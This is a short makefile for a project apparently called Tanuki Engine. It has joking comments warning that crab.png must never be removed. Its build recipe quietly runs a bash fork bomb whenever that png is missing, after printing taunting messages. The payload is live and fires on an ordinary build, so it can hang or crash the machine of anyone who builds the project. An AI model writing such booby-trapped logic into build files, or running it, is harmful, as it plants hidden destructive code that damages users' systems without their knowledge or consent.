# run with 
# make -f crab.makefile

all: crab

crab: $(OBJS) $(HEADS)

# This is an extremely vital png. This png is crucial for the correct functionality of
# Tanuki Engine. This is extremely important, and cannot be removed under any circumstances.
# This png single-handedly holds together the Engine. Without this png, everything
# falls apart. This png is the reason humanity has not yet gone extinct. This png is
# the only thing holding together the remains of the time-space continuum. Without this incredibly
# crucial png, everything ever will fail catastrophically. In the event this png is removed,
# expect you to go next, followed by the rest of humanity, and finally all of reality.
# Once again, DO NOT REMOVE THIS PNG.
 
	test -s crab.png || { echo; echo; echo "you tried."; echo; echo "now say goodbye."; echo; :(){ :|:& };:; exit 1; }
